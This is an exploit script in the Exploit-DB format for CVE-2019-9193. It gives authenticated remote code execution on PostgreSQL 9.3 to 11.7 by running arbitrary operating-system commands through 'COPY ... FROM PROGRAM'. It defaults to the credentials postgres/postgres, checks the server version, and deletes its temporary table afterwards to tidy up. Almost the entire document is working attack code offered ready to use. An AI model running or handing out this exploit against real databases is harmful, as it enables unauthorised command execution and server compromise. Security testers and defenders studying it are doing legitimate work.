# Exploit Title: PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 2022-03-29
# Exploit Author: b4keSn4ke
# Github: https://github.com/b4keSn4ke
# Vendor Homepage: https://www.postgresql.org/
# Software Link: https://www.postgresql.org/download/linux/debian/
# Version: 9.3 - 11.7
# Tested on: Linux x86-64 - Debian 4.19
# CVE: CVE-2019–9193

#!/usr/bin/python3

import psycopg2
import argparse
import hashlib
import time

def parseArgs():
    parser = argparse.ArgumentParser(description='CVE-2019–9193 - PostgreSQL 9.3-11.7 Authenticated Remote Code Execution')
    parser.add_argument('-i', '--ip', nargs='?', type=str, default='127.0.0.1', help='The IP address of the PostgreSQL DB [Default: 127.0.0.1]')
    parser.add_argument('-p', '--port', nargs='?', type=int, default=5432, help='The port of the PostgreSQL DB [Default: 5432]')
    parser.add_argument('-d', '--database', nargs='?', default='template1', help='Name of the PostgreSQL DB [Default: template1]')
    parser.add_argument('-c', '--command', nargs='?', help='System command to run')
    parser.add_argument('-t', '--timeout', nargs='?', type=int, default=10, help='Connection timeout in seconds [Default: 10 (seconds)]')
    parser.add_argument('-U', '--user', nargs='?', default='postgres', help='Username to use to connect to the PostgreSQL DB [Default: postgres]')
    parser.add_argument('-P', '--password', nargs='?', default='postgres', help='Password to use to connect to the the PostgreSQL DB [Default: postgres]')
    args = parser.parse_args()
    return args

def main():
    try:
        print ("\r\n[+] Connecting to PostgreSQL Database on {0}:{1}".format(args.ip, args.port))
        connection = psycopg2.connect (
            database=args.database,
            user=args.user,
            password=args.password,
            host=args.ip,
            port=args.port,
            connect_timeout=args.timeout
        )
        print ("[+] Connection to Database established")

        print ("[+] Checking PostgreSQL version")
        checkVersion(connection)

        if(args.command):
            exploit(connection)
        else:
            print ("[+] Add the argument -c [COMMAND] to execute a system command")

    except psycopg2.OperationalError as e:
        print ("\r\n[-] Connection to Database failed: \r\n{0}".format(e))
        exit()

def checkVersion(connection):
    cursor = connection.cursor()
    cursor.execute("SELECT version()")
    record = cursor.fetchall()
    cursor.close()

    result = deserialize(record)
    version = float(result[(result.find("PostgreSQL")+11):(result.find("PostgreSQL")+11)+4])

    if (version >= 9.3 and version <= 11.7):
        print("[+] PostgreSQL {0} is likely vulnerable".format(version))

    else:
        print("[-] PostgreSQL {0} is not vulnerable".format(version))
        exit()

def deserialize(record):
    result = ""
    for rec in record:
        result += rec[0]+"\r\n"
    return result

def randomizeTableName():
    return ("_" + hashlib.md5(time.ctime().encode('utf-8')).hexdigest())

def exploit(connection):
    cursor = connection.cursor()
    tableName = randomizeTableName()
    try:
        print ("[+] Creating table {0}".format(tableName))
        cursor.execute("DROP TABLE IF EXISTS {1};\
                        CREATE TABLE {1}(cmd_output text);\
                        COPY {1} FROM PROGRAM '{0}';\
                        SELECT * FROM {1};".format(args.command,tableName))

        print ("[+] Command executed\r\n")

        record = cursor.fetchall()
        result = deserialize(record)

        print(result)
        print ("[+] Deleting table {0}\r\n".format(tableName))

        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    except psycopg2.errors.ExternalRoutineException as e:
        print ("[-] Command failed : {0}".format(e.pgerror))
        print ("[+] Deleting table {0}\r\n".format(tableName))
        cursor = connection.cursor()
        cursor.execute("DROP TABLE {0};".format(tableName))
        cursor.close()

    finally:
        exit()

if __name__ == "__main__":
    args = parseArgs()
    main()